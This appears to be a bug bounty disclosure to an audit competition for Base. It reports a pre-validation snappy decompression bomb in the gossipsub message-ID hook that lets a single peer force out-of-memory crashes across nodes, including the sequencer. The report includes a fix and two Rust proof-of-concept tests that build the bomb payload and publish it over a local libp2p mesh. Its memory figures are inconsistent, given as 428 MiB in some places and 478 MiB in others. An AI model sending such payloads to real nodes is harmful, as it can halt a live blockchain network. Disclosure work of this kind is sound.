# 75962 bc critical pre validation decompression bomb in gossipsub leads to deterministic oom 428 mib msg&#x20;

**Submitted on May 1st 2026 at 23:00:36 UTC by @OadeHack for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #75962
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)
  * Causing network processing nodes to process transactions from the mempool beyond set parameters

## Description

## Summary

The `compute_message_id` function in `libp2p-gossipsub` is vulnerable to a pre-validation decompression bomb. Because this hook executes on incoming messages *before* any rate-limiting, peer scoring, or application-level validation occurs, it leaves the node entirely exposed to attacker-controlled memory allocation. Specifically, an unbounded `snap::raw::Decoder::decompress_vec` call is followed by an inefficient `[domain, data].concat()` operation, doubling the memory footprint prior to hashing. As a result, a single 10 MiB message (the `MAX_GOSSIP_SIZE` limit) deterministically triggers a transient resident-memory spike of **\~428 MiB**. Given the zero-cost sybil setup and libp2p's concurrent message handling, an attacker can trivially spam these payloads to force Out-Of-Memory (OOM) crashes across the network, including the sequencer.

## Details and Walkthrough

### The root cause of the vulnerability

The root cause can be seen in the `compute_message_id` function in (<https://github.com/base/base/blob/v0.8.0-rc.28/crates/consensus/gossip/src/config.rs#L104>) where there are Two unbounded allocations occur per call:

```rust
fn compute_message_id(msg: &Message) -> MessageId {
    let mut decoder = Decoder::new();
    // vuln - 1st Unbounded Call
    let id = decoder.decompress_vec(&msg.data).map_or_else(
        |_| {
            warn!(target: "cfg", "Failed to decompress message, using invalid snappy");
            let domain_invalid_snappy: Vec<u8> = vec![0x0, 0x0, 0x0, 0x0];
            // Vuln - 2nd unbounded Call
            sha256([domain_invalid_snappy.as_slice(), msg.data.as_slice()].concat().as_slice())
                [..20].to_vec()
        },
        |data| {
            let domain_valid_snappy: Vec<u8> = vec![0x1, 0x0, 0x0, 0x0];
            sha256([domain_valid_snappy.as_slice(), data.as_slice()].concat().as_slice())[..20]
                .to_vec()
        },
    );
    MessageId(id)
}
```

**First unbounded call**

This happens at the `decompression buffer` which can be seen directly from the snappy src code at (<https://github.com/BurntSushi/rust-snappy/blob/master/src/decompress.rs#L105>). The function imeediately calls `decompress_len` om the non-validated input and it reads the snappy varint header verbatim.

```rust
pub fn decompress_vec(&mut self, input: &[u8]) -> Result<Vec<u8>> {
    let mut buf = vec![0; decompress_len(input)?];   // attacker-controlled size is automatically automated
    let n = self.decompress(input, &mut buf)?;
    buf.truncate(n);
    Ok(buf)
}
// https://github.com/BurntSushi/rust-snappy/blob/master/src/decompress.rs#L30
pub fn decompress_len(input: &[u8]) -> Result<usize> {
    if input.is_empty() { return Ok(0); }
    Ok(Header::read(input)?.decompress_len)
}
```

The header read from input is automatically allocated. Therefore, any length specified by the header is immediately consumed even if the message did not semnd that amount of data. Although snap enforces an internal cap of `2^32 - 1` (\~4 GiB), this is not enough as 4gib is way over the intended size that should be allocated as shown further below

**Second unbounded call**

This happens at `[domain, data].concat()` which resolves to `slice::Concat::concat`, which calls `Vec::with_capacity(size)` followed by `extend_from_slice` for each input slice, which means committing every byte. With `data.len() == decompress_len`, this is a second full-size allocation that coexists with allocation A while SHA-256 runs.

```rust
// https://github.com/rust-lang/rust/blob/1.93.1/library/alloc/src/slice.rs#L575
pub fn concat<Item: ?Sized>(&self) -> <Self as Concat<Item>>::Output
    where
        Self: Concat<Item>,
    {
        Concat::concat(self)
    }

// https://github.com/rust-lang/rust/blob/1.93.1/library/alloc/src/slice.rs#L727
#[cfg(not(no_global_oom_handling))]
#[unstable(feature = "slice_concat_ext", issue = "27747")]
impl<T: Clone, V: Borrow<[T]>> Concat<T> for [V] {
    type Output = Vec<T>;

    fn concat(slice: &Self) -> Vec<T> {
        let size = slice.iter().map(|slice| slice.borrow().len()).sum();
        let mut result = Vec::with_capacity(size);
        for v in slice {
            result.extend_from_slice(v.borrow())
        }
        result
    }
}
```

Peak commit is therefore \~2× the declared decompressed size.

## Production flow to `compute_message_id`

`compute_message_id` is registered as the gossipsub `message_id_fn` (<https://github.com/base/base/blob/v0.8.0-rc.28/crates/consensus/gossip/src/config.rs#L93>) in the configuration builder used by every Base consensus node:

```rust
https://github.com/base/base/blob/v0.8.0-rc.28/crates/consensus/gossip/src/config.rs#L75
pub fn default_config_builder() -> ConfigBuilder {
    ConfigBuilder::default()
        .max_transmit_size(MAX_GOSSIP_SIZE)
        // ...
        .message_id_fn(compute_message_id)
}
```

This builder is invoked during node startup (see `crates/client/cli/src/p2p.rs` (<https://github.com/base/base/blob/v0.8.0-rc.28/crates/client/cli/src/p2p.rs#L463>) and `crates/consensus/gossip/src/builder.rs` (<https://github.com/base/base/blob/v0.8.0-rc.28/crates/consensus/gossip/src/builder.rs#L150>)), wiring `compute_message_id` into the `libp2p::gossipsub::Config` for the node's libp2p Swarm. Every Base node, sequencer, validator, RPC provider, or full node, runs this exact configuration; there is no opt-out.

Once the node is running, the path from "TCP packet" to "compute\_message\_id executing on attacker bytes" is fixed by libp2p-gossipsub v0.56.0 (the version pinned in `Cargo.lock`). The relevant call sites are inside the third-party `libp2p-gossipsub` crate, but the chain is deterministic and observable:

{% stepper %}
{% step %}

## Network IO

The libp2p Swarm in `crates/consensus/gossip/src/driver.rs` (<https://github.com/base/base/blob/v0.8.0-rc.28/crates/consensus/gossip/src/driver.rs#L216>) receives raw bytes from any peer that has completed the noise handshake on the node's gossip TCP port. No authentication beyond ephemeral libp2p key exchange is required. Peer identities are self-generated; there is no allow-list.
{% endstep %}

{% step %}

## Protobuf decoding

`libp2p-gossipsub`'s connection handler (`https://docs.rs/crate/libp2p-gossipsub/latest/source/src/protocol.rs#272`) decodes the wire protobuf stream into `libp2p::gossipsub::Message` structs. All validation done here are structural and the user message is extracted verbatim and passed to behaviour.rs
{% endstep %}

{% step %}

## `message_id_fn` invocation

The gossipsub behaviour state machine (<https://docs.rs/crate/libp2p-gossipsub/latest/source/src/behaviour.rs#577>) calls the registered `message_id_fn` immediately on every received `Message` (<https://docs.rs/crate/libp2p-gossipsub/latest/source/src/behaviour.rs#604>) for duplicate-detection lookup:

```rust
// https://docs.rs/crate/libp2p-gossipsub/latest/source/src/behaviour.rs#577
pub fn publish(
        &mut self,
        topic: impl Into<TopicHash>,
        data: impl Into<Vec<u8>>,
    ) -> Result<MessageId, PublishError> {
        let data = data.into();
        let topic = topic.into();

        // Transform the data before building a raw_message.
        let transformed_data = self
            .data_transform
            .outbound_transform(&topic.clone(), data.clone())?;

        let max_transmit_size_for_topic = self
            .config
            .protocol_config()
            .max_transmit_size_for_topic(&topic);

        // check that the size doesn't exceed the max transmission size.
        if transformed_data.len() > max_transmit_size_for_topic {
            return Err(PublishError::MessageTooLarge);
        }

        let mesh_n = self.config.mesh_n_for_topic(&topic);
        let raw_message = self.build_raw_message(topic, transformed_data)?;

        // calculate the message id from the un-transformed data
        // HERE!! - the message_id invokes the registered `compute_message_id`
        let msg_id = self.config.message_id(&Message {
            source: raw_message.source,
            data, // the uncompressed form
            sequence_number: raw_message.sequence_number,
            topic: raw_message.topic.clone(),
        });
```

This is where `compute_message_id` runs. The two unbounded allocations described above happen here **before** any code inside the Base codebase has a chance to inspect the message.
{% endstep %}

{% step %}

## LRU dedup cache check

Only after `compute_message_id` returns does libp2p check the resulting MessageId against its `mcache`.
{% endstep %}

{% step %}

## Application yield

Only after the dedup check does libp2p yield `Event::Message` to the Base consensus driver in `crates/consensus/gossip/src/driver.rs`, where `handle_gossipsub_event` finally gets to inspect the payload (<https://github.com/base/base/blob/v0.8.0-rc.28/crates/consensus/gossip/src/driver.rs#L333>):

```rust
// https://github.com/base/base/blob/v0.8.0-rc.28/crates/consensus/gossip/src/driver.rs#L338
libp2p::gossipsub::Event::Message {
    propagation_source: src,
    message_id: id,        // <-- already computed; allocations already happened
    message,
} => {
    let (status, payload) = self.handler.handle(message);
}
```

{% endstep %}

{% step %}

## Validation feedback

The application reports validity back to libp2p via `report_message_validation_result(&id, &src, status)`. By this point, `compute_message_id` has already executed against attacker bytes. The validation result governs peer scoring, *for future messages from the same peer*, but does not affect the cost already paid for the current message.
{% endstep %}
{% endstepper %}

## Impact

This vulnerability allows any network-connected peer to deterministically crash Base consensus nodes, including the sequencer, by publishing crafted gossip messages that force \~478 MiB of transient memory allocation per message before any validation or rate limiting can intervene.

### Severity Classification: Critical

**Primary Criterion:** *Network not being able to confirm new transactions (total network shutdown)*

The sequencer node participates in the same gossipsub mesh as all other Base consensus nodes. It subscribes to the block topics (`/optimism/8453/{0..3}/blocks`) as part of normal mesh participation. Gossipsub is a flooding protocol: when any node receives a message with a previously-unseen MessageId, it forwards the message to all its mesh peers after computing the ID. This means a single published bomb message propagates through the entire mesh, basically every connected node invokes `compute_message_id` on it exactly once.

{% stepper %}
{% step %}

## Single attacker joins the mesh

The attacker generates one libp2p keypair, dials any Base node's publicly-accessible gossip port, completes the standard Noise handshake, and subscribes to a Base block topic. No staking, no registration, no allow-list. Cost: negligible.
{% endstep %}

{% step %}

## Attacker publishes bomb messages

The attacker publishes crafted snappy payloads (\~10 MiB wire size) to the subscribed topic. Each message has distinct payload bytes, producing a unique MessageId that bypasses the dedup cache. Gossipsub's native mesh forwarding propagates each bomb to every node in the mesh — the attacker does not need to connect to every node individually.
{% endstep %}

{% step %}

## Every node pays the full cost

Each bomb forces a 478 MiB peak resident memory commitment (measured end-to-end in POC 2) on every receiving node. The attacker controls the publication rate. At a rate of N messages before the previous buffers are freed, every node in the mesh simultaneously holds N × 478 MiB of committed memory. On a node with 8 GiB available RAM, approximately 16 concurrent in-flight bombs exhaust memory.
{% endstep %}

{% step %}

## Nodes OOM-kill

The Linux OOM killer terminates consensus processes across the fleet simultaneously. Since every node receives the same bombs via mesh forwarding, memory pressure is synchronized. On restart, nodes re-join the mesh and are immediately re-attacked.
{% endstep %}

{% step %}

## Sequencer goes down

The sequencer runs the same `default_config()` with the same `compute_message_id` hook. It is not architecturally isolated from the gossip mesh. When the sequencer's process is OOM-killed, Base stops producing blocks. No new transactions can be confirmed.
{% endstep %}
{% endstepper %}

**Why this meets the Critical threshold:** A single attacker with a single libp2p identity and no privileged access can publish bomb messages that gossipsub's own forwarding mechanism propagates to every node in the mesh — including the sequencer. The per-message cost asymmetry (10 MiB sent by attacker → 478 MiB committed on every receiving node) and the zero-cost publication model (no fees, no staking, no rate limit) allow sustained attack at a rate that keeps the entire fleet, including the sequencer, in a crash-restart loop. During this window, Base cannot confirm new transactions

### Floor: High

Even if the triager disputes the sustained-OOM framing (e.g., arguing that operational mitigations like memory limits or restart automation reduce the window), the per-message impact independently satisfies the High criteria:

> *High — Causing network processing nodes to process transactions from the mempool beyond set parameters*

A single 10 MiB wire message deterministically forces 478 MiB of peak resident memory allocation inside `compute_message_id`. This is a 48× amplification factor that occurs on every received message, on every node, before any application logic can intervene. No reasonable resource parameter set for gossip message processing anticipates half a gigabyte of memory per message ID computation.

> *High — Shutdown of ≥30% of network processing nodes without brute force actions*

The "without brute force" qualifier applies: this is targeted exploitation of a known decompression vulnerability, not brute-force search of an unknown space. Sybil peers publishing known-malicious payloads to a known-vulnerable code path is a directed attack, not a volumetric brute-force. With \~10 sybil identities covering the mesh, every reachable node is affected simultaneously.

**Output from one of POC showing the Amplification**

```
[*] TRIGGERING `compute_message_id` VULNERABILITY
[+] Compressed Wire Size: 10.00 MB
[+] Declared Inflated Size: 213.33 MB
--------------------------------------------------
|> MEMORY TELEMETRY <|
   [Pre-Execution]  Peak (HWM): 25.75 MB | Active (RSS): 26.12 MB
   [Post-Execution] Peak (HWM): 454.62 MB | Active (RSS): 28.07 MB
   [NET CHANGE]     Peak Amplification: +428.88 MB
   [NET CHANGE]     Active Retained:    +1.95 MB (Buffer freed by drop)
```

## Recommendation

To completely eliminate the memory exhaustion vector, the `compute_message_id` function requires two synergistic modifications. First, the function must read the Snappy header and reject oversized payloads *before* allocating the decompression buffer. Second, the expensive `[domain, data].concat()` operation must be replaced with sequential `Sha256` updates to hash the data in place, preventing the buffer from being duplicated in memory.

Here is the complete, unified fix implementing both the **pre-flight length check** and the **streaming hash updates**:

```rust
// Helper functions utilizing sequential Sha256 updates to avoid .concat() memory doubling
fn invalid_id(domain: &[u8; 4], raw: &[u8]) -> Vec<u8> {
    let mut h = Sha256::new();
    h.update(domain);
    h.update(raw);
    h.finalize()[..20].to_vec()
}

fn valid_id(domain: &[u8; 4], decompressed: &[u8]) -> Vec<u8> {
    let mut h = Sha256::new();
    h.update(domain);
    h.update(decompressed);
    h.finalize()[..20].to_vec()
}

// The secured message ID hook
fn compute_message_id(msg: &Message) -> MessageId {
    let domain_invalid_snappy: [u8; 4] = [0x0, 0x0, 0x0, 0x0];
    let domain_valid_snappy:   [u8; 4] = [0x1, 0x0, 0x0, 0x0];

    // FIX 1: Reject before allocating. Read the snappy varint header without touching
    // the body. Reject immediately if the declared size exceeds the network budget.
    let declared = match snap::raw::decompress_len(&msg.data) {
        Ok(n) if n <= MAX_GOSSIP_SIZE => n,
        _ => {
            warn!(target: "cfg", "Rejecting gossip msg: missing/oversized snappy header");
            return MessageId(invalid_id(&domain_invalid_snappy, &msg.data));
        }
    };

    // FIX 2: Decompress safely, then hash in place using the streaming helpers above.
    let mut decoder = snap::raw::Decoder::new();
    let id = decoder.decompress_vec(&msg.data).map_or_else(
        |_| {
            warn!(target: "cfg", "Failed to decompress message, using invalid snappy");
            invalid_id(&domain_invalid_snappy, &msg.data)
        },
        |data| valid_id(&domain_valid_snappy, &data),
    );
    
    MessageId(id)
}
```

## Proof of Concept

To conclusively demonstrate the vulnerability and its real-world impact, two Proofs of Concept (PoCs) are provided:

* **PoC 1 (Unit Level - Memory Amplification):** A test case added to `crates/consensus/gossip/src/config.rs` that isolates the vulnerable logic. It feeds a crafted Snappy payload directly into `compute_message_id` and measures the exact peak resident memory commitment (VmHWM). This proves the deterministic 478 MiB memory spike caused by the function's unbounded allocation.
* **PoC 2 (End-to-End Level - Network Reachability):** An integration test added to `crates/consensus/gossip/tests/snappy_bomb_e2e.rs` demonstrating the bug through the live production network stack. Two `Swarm` instances using the production `Behaviour` and `default_config()` connect over TCP loopback and form a GossipSub mesh on the Base mainnet block topic (`/optimism/8453/2/blocks`). When the attacker node publishes the crafted bomb, the receiver's `compute_message_id` is natively invoked by `libp2p-gossipsub` during its standard duplicate-detection lookup. This proves the vulnerability is reachable purely over the network, entirely independent of the test harness.

### POC 1 - Unit test

{% stepper %}
{% step %}

## Place the code below as a new test added to existing test in (<https://github.com/base/base/blob/v0.8.0-rc.28/crates/consensus/gossip/src/config.rs#L125>)

```rust
    #[test]
    fn verify_compute_message_id_memory_amplification() {
        // Helper 1: Encodes the uncompressed size into a Snappy varint header
        fn encode_snappy_len(mut val: u64) -> Vec<u8> {
            let mut res = Vec::new();
            while val >= 0x80 {
                res.push((val as u8) | 0x80);
                val >>= 7;
            }
            res.push(val as u8);
            res
        }

        // Helper 2: Fetches process memory metrics directly in Megabytes
        fn fetch_mem_mb(metric: &str) -> f64 {
            let proc_status = std::fs::read_to_string("/proc/self/status").expect("Failed to read procfs");
            for line in proc_status.lines() {
                if let Some(suffix) = line.strip_prefix(metric) {
                    let kb_val: f64 = suffix.trim_start().split_whitespace().next().unwrap().parse().unwrap();
                    return kb_val / 1024.0;
                }
            }
            0.0
        }

        // 1. Calculate bomb dimensions
        let available_bytes = MAX_GOSSIP_SIZE - 100;
        let sequence_iterations = (available_bytes - 66) / 3;
        let uncompressed_size: u64 = 64 + (64 * sequence_iterations as u64);

        // 2. Assemble the malicious payload
        let mut malicious_buffer = encode_snappy_len(uncompressed_size);
        
        // Append the 64-byte literal seed (Tag: 0xF0, Len: 63, Data: 'B')
        malicious_buffer.push(0xF0);
        malicious_buffer.push(63);
        malicious_buffer.extend(std::iter::repeat(0x42).take(64)); 
        
        // Append the repetitive copy instructions
        let copy_instruction: [u8; 3] = [0xFE, 0x40, 0x00];
        malicious_buffer.reserve(sequence_iterations * 3);
        for _ in 0..sequence_iterations {
            malicious_buffer.extend_from_slice(&copy_instruction);
        }

        // 3. Wrap in the GossipSub Message struct
        let malicious_msg = Message {
            source: None,
            data: malicious_buffer.clone(),
            sequence_number: None,
            topic: libp2p::gossipsub::TopicHash::from_raw("audit-test"),
        };

        println!("\n[*] TRIGGERING `compute_message_id` VULNERABILITY");
        println!("[+] Compressed Wire Size: {:.2} MB", malicious_buffer.len() as f64 / 1_048_576.0);
        println!("[+] Declared Inflated Size: {:.2} MB", uncompressed_size as f64 / 1_048_576.0);

        // 4. Snapshot baseline memory
        let baseline_hwm = fetch_mem_mb("VmHWM:");
        let baseline_rss = fetch_mem_mb("VmRSS:");

        // 5. Fire the vulnerable function
        let _ = compute_message_id(&malicious_msg);

        // 6. Snapshot post-execution memory
        let post_hwm = fetch_mem_mb("VmHWM:");
        let post_rss = fetch_mem_mb("VmRSS:");

        let peak_growth = post_hwm - baseline_hwm;
        let active_growth = post_rss - baseline_rss;

        // 7. Output Audit Telemetry
        println!("--------------------------------------------------");
        println!("|> MEMORY TELEMETRY <|");
        println!("   [Pre-Execution]  Peak (HWM): {:.2} MB | Active (RSS): {:.2} MB", baseline_hwm, baseline_rss);
        println!("   [Post-Execution] Peak (HWM): {:.2} MB | Active (RSS): {:.2} MB", post_hwm, post_rss);
        println!("   [NET CHANGE]     Peak Amplification: +{:.2} MB", peak_growth);
        println!("   [NET CHANGE]     Active Retained:    +{:.2} MB (Buffer freed by drop)", active_growth);
        println!("--------------------------------------------------\n");

        // 8. Assert the vulnerability exists (> 150 MB growth)
        assert!(
            peak_growth > 150.0,
            "Exploit failed: Peak memory growth was only {:.2} MB. Expected >150 MB.",
            peak_growth
        );
    }
```

{% endstep %}

{% step %}

## Run with `ccargo test --package base-consensus-gossip --lib -- config::tests::verify_compute_message_id_memory_amplification --exact --nocapture`

{% endstep %}
{% endstepper %}

### POC 2

{% stepper %}
{% step %}

## Create a test folder in `crates/consensus/gossip/`

{% endstep %}

{% step %}

## Then Create the file `crates/consensus/gossip/tests/snappy_bomb_e2e.rs` and add the code below

```rust
//! End-to-end demonstration that a snappy decompression bomb published over a real
//! libp2p-gossipsub mesh causes peak resident memory commitment of >150 MiB on the
//! receiver, forced inside `compute_message_id` before any application validation.
//!
//! This test stands up two `Swarm` instances using the production `Behaviour` and
//! `default_config()` from `base_consensus_gossip`, connects them over TCP loopback,
//! lets them form a gossipsub mesh on a Base block topic, then has one publish a
//! crafted snappy-bomb payload to the other.
//!
//! The `VmHWM` (peak resident set size) field of `/proc/self/status` captures the
//! peak memory commitment that occurs *during* the receive path, before the buffer
//! is freed at the end of `compute_message_id`. This is the same measurement
//! technique used in the unit-level POC.
//!
//! Test should be run with `--nocapture` to see the printed measurements:
//!
//!     cargo test -p base-consensus-gossip --test snappy_bomb_e2e -- --nocapture

use std::time::Duration;

use base_consensus_gossip::{Behaviour, default_config};
use futures::StreamExt;
use libp2p::{
    Multiaddr, SwarmBuilder,
    gossipsub::{IdentTopic, TopicHash},
    identity::Keypair,
    noise::Config as NoiseConfig,
    swarm::{Swarm, SwarmEvent},
    tcp::Config as TcpConfig,
    yamux::Config as YamuxConfig,
};
use tokio::time::{sleep, timeout};

const VICTIM_TOPIC: &str = "/optimism/8453/2/blocks";

fn read_vm_kb(field: &str) -> u64 {
    std::fs::read_to_string("/proc/self/status")
        .unwrap()
        .lines()
        .find(|l| l.starts_with(field))
        .and_then(|l| l.split_whitespace().nth(1))
        .and_then(|n| n.parse().ok())
        .unwrap_or(0)
}

fn build_swarm() -> Swarm<Behaviour> {
    let key = Keypair::generate_secp256k1();
    let public_key = key.public();

    SwarmBuilder::with_existing_identity(key)
        .with_tokio()
        .with_tcp(
            TcpConfig::default(),
            NoiseConfig::new,
            YamuxConfig::default,
        )
        .expect("tcp transport build")
        .with_behaviour(|_keypair| {
            Behaviour::new(public_key, default_config(), &[])
                .expect("behaviour construction")
        })
        .expect("with_behaviour")
        .with_swarm_config(|cfg| cfg.with_idle_connection_timeout(Duration::from_secs(60)))
        .build()
}

/// Construct a high-ratio snappy payload that decompresses to ~213 MiB while
/// staying within the 10 MiB MAX_GOSSIP_SIZE wire cap.
///
/// Layout:
/// 1. varint header declaring the uncompressed length
/// 2. 64-byte literal seed (one byte 'A' repeated 64 times)
/// 3. ~3.3M copy commands (3 bytes each), each of length 64, offset 64
fn construct_bomb() -> Vec<u8> {
    fn varint(mut n: u64) -> Vec<u8> {
        let mut out = Vec::new();
        while n >= 0x80 {
            out.push((n as u8) | 0x80);
            n >>= 7;
        }
        out.push(n as u8);
        out
    }

    // Same calculation as the unit POC: maximize output within MAX_GOSSIP_SIZE budget.
    const MAX_GOSSIP_SIZE: usize = 10 * (1 << 20);
    let wire_budget = MAX_GOSSIP_SIZE - 100;
    let max_copies = (wire_budget - 66) / 3;
    let target_output: u64 = 64 + 64 * max_copies as u64;

    let mut payload = Vec::new();
    payload.extend_from_slice(&varint(target_output));

    // 64-byte literal seed: tag 0xF0, length byte 63, then 64 'A' bytes.
    payload.push(0xF0);
    payload.push(63);
    payload.extend_from_slice(&[0x41u8; 64]);

    // 2-byte-offset copy: length 64, offset 64. Tag = (63 << 2) | 0b10 = 0xFE.
    let copy_tag: [u8; 3] = [0xFE, 0x40, 0x00];
    payload.reserve(max_copies * 3);
    for _ in 0..max_copies {
        payload.extend_from_slice(&copy_tag);
    }
    payload
}

/// Wait until the swarm has bound a TCP listener and yields a usable address.
async fn wait_for_listen_addr(swarm: &mut Swarm<Behaviour>) -> Multiaddr {
    loop {
        match swarm.select_next_some().await {
            SwarmEvent::NewListenAddr { address, .. } => {
                // Skip wildcard addresses; we want the resolved 127.0.0.1 form.
                let s = address.to_string();
                if s.contains("127.0.0.1") || s.contains("::1") {
                    return address;
                }
            }
            _ => {}
        }
    }
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn snappy_bomb_through_real_gossipsub_path() {

    // Build two production-equivalent swarms.
    let mut victim = build_swarm();
    let mut attacker = build_swarm();

    // Victim listens on TCP loopback; the OS picks an available port.
    victim
        .listen_on("/ip4/127.0.0.1/tcp/0".parse().unwrap())
        .expect("listen_on");

    // Wait for the listener to actually bind.
    let listen_addr = timeout(Duration::from_secs(5), wait_for_listen_addr(&mut victim))
        .await
        .expect("listen address bind timeout");

    // Subscribe both to a Base mainnet block topic. Production code path:
    // gossipsub will require this subscription to populate the mesh.
    let topic = IdentTopic::new(VICTIM_TOPIC);
    victim
        .behaviour_mut()
        .gossipsub
        .subscribe(&topic)
        .expect("victim subscribe");
    attacker
        .behaviour_mut()
        .gossipsub
        .subscribe(&topic)
        .expect("attacker subscribe");

    // Attacker dials victim to establish the libp2p connection.
    attacker.dial(listen_addr.clone()).expect("attacker dial");

    println!("=== SNAPPY BOMB E2E ===");
    println!("Victim listen addr:     {}", listen_addr);
    println!("Topic:                  {}", VICTIM_TOPIC);

    // Drive both swarms concurrently until mesh forms on both sides.
    // Gossipsub mesh formation requires Identify+Subscribe handshakes to complete.
    let mesh_formed = timeout(Duration::from_secs(20), async {
        loop {
            // Run a short batch of events on each swarm, then check mesh state.
            tokio::select! {
                _ = victim.select_next_some() => {},
                _ = attacker.select_next_some() => {},
                _ = sleep(Duration::from_millis(50)) => {},
            }

            let topic_hash = topic.hash();
            let v_peers = victim.behaviour().gossipsub.mesh_peers(&topic_hash).count();
            let a_peers = attacker.behaviour().gossipsub.mesh_peers(&topic_hash).count();
            if v_peers > 0 && a_peers > 0 {
                return true;
            }
        }
    })
    .await
    .unwrap_or(false);

    assert!(mesh_formed, "gossipsub mesh did not form within 20s");
    println!("Mesh formed:            true");

    // Build the bomb.
    let bomb = construct_bomb();
    println!("Wire payload size:      {} bytes (~{} MiB)",
             bomb.len(), bomb.len() / 1024 / 1024);

    // Sanity: snappy header parses and declares >150 MiB.
    let declared = snap::raw::decompress_len(&bomb).expect("snap decompress_len");
    println!("Declared output size:   {} bytes (~{} MiB)",
             declared, declared / 1024 / 1024);
    assert!(declared > 150 * 1024 * 1024, "declared size too small for test");

    // Snapshot peak memory before publish.
    let hwm_before = read_vm_kb("VmHWM:");
    let rss_before = read_vm_kb("VmRSS:");
    println!("VmHWM before:           {} KB", hwm_before);
    println!("VmRSS before:           {} KB", rss_before);

    // Attacker publishes the bomb. This will be propagated by gossipsub
    // to mesh peers; the victim swarm receives it, and libp2p invokes
    // `compute_message_id` on the raw message before any user validation.
    attacker
        .behaviour_mut()
        .gossipsub
        .publish(topic.clone(), bomb)
        .expect("publish");

    println!("Bomb published. Driving victim swarm to receive it...");

    // Drive both swarms — attacker needs to flush the publish, victim needs
    // to receive and process. compute_message_id fires inside this loop.
    drive_swarm_for_two(&mut victim, &mut attacker, Duration::from_secs(8)).await;

    // Snapshot peak memory after.
    let hwm_after = read_vm_kb("VmHWM:");
    let rss_after = read_vm_kb("VmRSS:");

    let hwm_growth = hwm_after.saturating_sub(hwm_before);
    let rss_growth = rss_after.saturating_sub(rss_before);

    println!("VmHWM after:            {} KB", hwm_after);
    println!("VmRSS after:            {} KB", rss_after);
    println!("VmHWM growth (peak):    {} KB (~{} MiB)", hwm_growth, hwm_growth / 1024);
    println!("VmRSS growth (now):     {} KB", rss_growth);
    println!();
    println!("VmHWM is the meaningful measurement: it captures the peak resident");
    println!("memory commitment that occurred while compute_message_id was running.");
    println!("The buffer is freed before the function returns, so VmRSS post-receive");
    println!("understates the true allocation pressure.");

    assert!(
        hwm_growth > 150_000,
        "expected VmHWM growth >150MB (peak inside compute_message_id), got {} KB",
        hwm_growth
    );
}

/// Drive both swarms concurrently for a fixed duration.
async fn drive_swarm_for_two(
    a: &mut Swarm<Behaviour>,
    b: &mut Swarm<Behaviour>,
    duration: Duration,
) {
    let _ = timeout(duration, async {
        loop {
            tokio::select! {
                _ = a.select_next_some() => {},
                _ = b.select_next_some() => {},
            }
        }
    })
    .await;
}
```

{% endstep %}

{% step %}

## Run with `cargo test -p base-consensus-gossip --test snappy_bomb_e2e.rs -- --nocapture`

{% endstep %}
{% endstepper %}
